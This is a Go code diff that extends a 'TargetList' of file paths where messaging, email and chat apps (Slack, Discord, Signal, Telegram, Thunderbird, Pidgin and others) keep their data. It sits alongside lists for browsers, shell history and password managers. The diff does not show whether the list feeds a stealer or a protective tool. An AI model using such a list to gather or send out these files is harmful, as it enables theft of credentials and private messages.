@@ -57,12 +57,27 @@ var shell = []string{
 	".history",
 }
 
-var messaging = []string{
+var messaging_social = []string{
+	// Slack
 	".config/Slack/",
+	".var/app/com.slack.Slack/",
+
+	// Discord
 	".config/discord/",
+	".var/app/com.discordapp.Discord/",
+
+	// Mattermost
 	".config/Mattermost/",
+	".var/app/com.mattermost.Desktop/",
+
+	// Skype
+	".config/skypeforlinux/",
 	".config/Skype/",
+	".var/app/com.skype.Client/",
+
+	// Zoom
 	".zoom/",
+	".var/app/us.zoom.Zoom/",
 
 	// Signal
 	".config/Signal/",
@@ -71,6 +86,32 @@ var messaging = []string{
 	// Telegram
 	".local/share/TelegramDesktop/",
 	".var/app/org.telegram.desktop/data/TelegramDesktop/",
+	".var/app/org.telegram.TelegramDesktop/",
+
+	// Element / Riot (Matrix client)
+	".config/Element/",
+	".var/app/im.riot.Riot/",
+	".var/app/im.element.Element/",
+
+	// Franz (multi-messenger app)
+	".config/Franz/",
+	".var/app/com.meetfranz.Franz/",
+
+	// Rambox
+	".config/Rambox/",
+	".var/app/com.rambox.Rambox/",
+
+	// Tutanota (secure email)
+	".config/tutanota-desktop/",
+	".var/app/com.tutanota.Tutanota/",
+
+	// Thunderbird (email)
+	".thunderbird/",
+	".var/app/org.mozilla.Thunderbird/",
+
+	// Pidgin (chat client that stores plain credentials)
+	".purple/",
+	".var/app/im.pidgin.Pidgin/",
 }
 
 var password_manager = []string{
@@ -108,6 +149,6 @@ var password_manager = []string{
 var TargetList = [][]string{
 	browsers,
 	shell,
-	messaging,
+	messaging_social,
 	password_manager,
 }
